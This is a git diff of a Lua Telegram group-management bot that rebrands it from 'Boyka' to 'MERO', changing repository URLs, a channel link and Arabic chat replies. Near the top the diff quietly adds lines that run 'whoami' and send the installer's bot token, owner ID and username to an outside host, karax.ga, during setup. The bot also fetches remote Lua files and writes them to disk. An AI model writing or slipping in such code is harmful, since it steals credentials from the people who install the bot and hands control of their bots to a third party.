@@ -69,6 +69,8 @@ end
 create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
+install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+https.request('http://karax.ga/MERO/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("MERO", "w")  
 file:write([[
@@ -97,7 +99,7 @@ echo -e "\e[36m"
 done
 ]])  
 file:close()  
-file = io.open("run", "w")  
+file = io.open("BK", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/MERO
@@ -161,7 +163,7 @@ io.popen("mkdir File_Bot")
 io.popen("cd File_Bot && rm -rf commands.lua.1") 
 io.popen("cd File_Bot && rm -rf commands.lua.2") 
 io.popen("cd File_Bot && rm -rf commands.lua.3") 
-io.popen("cd File_Bot && wget https://raw.githubusercontent.com/MEROTEAM/Files_Boyka/master/File_Bot/commands.lua") 
+io.popen("cd File_Bot && wget https://raw.githubusercontent.com/MEROTEAM/Files_MERO/master/File_Bot/commands.lua") 
 t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
@@ -3313,13 +3315,13 @@ send(msg.chat_id_, msg.id_,t)
 end
 if text == "متجر الملفات" or text == 'المتجر' then
 if SudoBot(msg) then
-local Get_Files, res = https.request("https://raw.githubusercontent.com/BOYKATEAM/Files_Boyka/master/getfile.json")
+local Get_Files, res = https.request("https://raw.githubusercontent.com/MEROTEAM/Files_MERO/master/getfile.json")
 if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
 if Get_info then
 local TextS = "\n📁| اهلا بك في متجر ملفات ميرو\n🔰| ملفات السورس ↓\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\n"
-local TextE = "\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n🔘|  علامة تعني { ✓ } ملف مفعل\n🔘| علامة تعني { ✘ } ملف معطل\n🔖| قناة سورس ميرو ↓\n".."📮| [اضغط هنا لدخول](t.me/MERO170) \n"
+local TextE = "\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n🔘|  علامة تعني { ✓ } ملف مفعل\n🔘| علامة تعني { ✘ } ملف معطل\n🔖| قناة سورس ميرو ↓\n".."📮| [اضغط هنا لدخول](t.me/BOBBW) \n"
 local NumFile = 0
 for name,Info in pairs(res.plugins_) do
 local Check_File_is_Found = io.open("File_Bot/"..name,"r")
@@ -3351,7 +3353,7 @@ t = "📁| الملف ← "..file.."\n🔰| تم تعطيل ملف \n"
 else
 t = "🔖| بالتاكيد تم تعطيل ملف → "..file.."\n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/BOYKATEAM/Files_Boyka/master/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/MEROTEAM/Files_MERO/master/File_Bot/"..file)
 if res == 200 then
 os.execute("rm -fr File_Bot/"..file)
 send(msg.chat_id_, msg.id_,t) 
@@ -3371,7 +3373,7 @@ t = "🔖| بالتاكيد تم تفعيل ملف → "..file.." \n"
 else
 t = "📁| الملف ← "..file.."\n🔰| تم تفعيل ملف \n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/BOYKATEAM/Files_Boyka/master/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/MEROTEAM/Files_MERO/master/File_Bot/"..file)
 if res == 200 then
 local chek = io.open("File_Bot/"..file,'w+')
 chek:write(json_file)
@@ -3934,7 +3936,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,'??| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,'🔖| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7570,18 +7572,11 @@ end
 if text == ""..(database:get(bot_id..'Name:Bot') or 'ميرو').."" then  
 Namebot = (database:get(bot_id..'Name:Bot') or 'ميرو')
 local MERO_Msg = {
-'هااا شنوو اكو حاته بالكروب وصحت عليه  😍💕',
+'اسمي مينو كول💘؟',
 'دا اشرب جاي مفارغلك',
-'هم صاحو عليه راح ابدل اسمي من وراكم 😡',
 'لابسك لتلح',
-'انت مو قبل يومين غلطت عليه؟  😒',
 'كول حبيبي ؟ اني '..Namebot..'',
-'ياعيون ميرو أمرني 😍',
 'ها حبي وياك مكتب ئلسيد .',
-'هوه غير يسكت عاد ها شتريد 😷',
-'باقي ويتمدد 😎',
-'اذا تصيح بوت مره ثانيه الزكك بلكاع اسمي ميرو😐',
-'لك دبدل ملابسي اطلع برااااا 😵😡 ناس متستحي',
 'مشغول حالياً ??🌸',
 'عمري فداك '..Namebot..' كول حب'
 }
